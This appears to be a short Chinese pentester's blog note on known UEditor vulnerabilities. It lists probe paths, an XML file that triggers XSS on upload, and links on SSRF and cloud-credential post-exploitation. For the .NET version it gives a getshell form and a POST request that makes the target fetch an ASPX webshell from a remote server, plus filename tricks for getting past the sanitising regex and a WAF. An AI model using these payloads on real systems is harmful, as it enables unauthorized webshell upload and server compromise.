---
title: ueditor_nday
date: 2024-12-07 13:24:16
updated: 2026-06-25 01:11:22
tags:
  - Web
---
```plain
console.log(UE.version)
```
```plain
/static/ueditor/index.html
/ueditor/index.html
/ueditor/utf8-net/index.html

/include/slineeditor/js/editor_config.js
/ueditor/utf8-net/ueditor.config.js

/ueditor/asp/controller.asp?action=listimage
/ueditor/asp/controller.asp?action=listfile

/ueditor/net/controller.ashx?action=listimage
/ueditor/net/controller.ashx?action=listfile
/ueditor/utf8-net/net/controller.ashx?action=catchimage

/ueditor/php/controller.php?action=listimage
/ueditor/php/controller.php?action=listfile

/ueditor/jsp/controller.jsp?action=listimage
/ueditor/jsp/controller.jsp?action=listfile
```
```plain
// 服务器统一请求接口路径
, serverUrl: URL + "php/controller.php"
```
[ueditor漏洞的总结.pdf](https://www.yuque.com/attachments/yuque/0/2024/pdf/39170111/1733578692177-07c29ed6-2016-4382-b0ed-cad27f5a5767.pdf)

# java、php

## 文件上传导致xss

```xml
<html>
  <head></head>
  <body>
    <something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(1);
    </something:script>
  </body>
</html>
```

## ssrf配合其他的漏洞点

### 配合网关漏洞进行rce

[某行业通用流程管控平台RCE之旅](https://mp.weixin.qq.com/s/sesveh4L_8osXt7HpVC9Nw)

### 云服务

后利用

重绑定网站

[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)

临时凭据的后利用

[https://zone.huoxian.cn/d/1064-ecs](https://zone.huoxian.cn/d/1064-ecs)

工具直接梭哈

[https://zone.huoxian.cn/d/1347-akskstssecuritytoken](https://zone.huoxian.cn/d/1347-akskstssecuritytoken)

# .net

1.4.3

## getshell

[UEditor .Net版本任意文件上传漏洞\_ueditor getshell-CSDN博客](https://blog.csdn.net/Jietewang/article/details/118884187)

```html
<form action="http://XXX.XXX.XXX.XXX:1111/plugins/ueditor/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">
 
<p>shell addr: <input type="text" name="source[]" /></p >
 
<input type="submit" value="Submit" />
 
</form>
```
```plain
POST /XXX/ueditor/net/controller.php?action=catchimage HTTP/1.1

source[]=http://(远程下载服务器)/3.jpg?.aspx
```

绕过waf方式,3.jpg(aspx马子)传到本身服务器，然后再去请求直接就可以绕过一定waf

  

```dart
var invalidPattern = new Regex(@"[\\\/\:\*\?\042\<\>\|]");
    originFileName = invalidPattern.Replace(originFileName, "");  //替换正则匹配到的为空1.png.aspx

xxx.gif?.a?s?p?x
3.jpg042.aspx
```

  

[学习笔记-.net安全之ueditor远程下载分析 - syscallwww - 博客园](https://www.cnblogs.com/haidragon/p/16865242.html)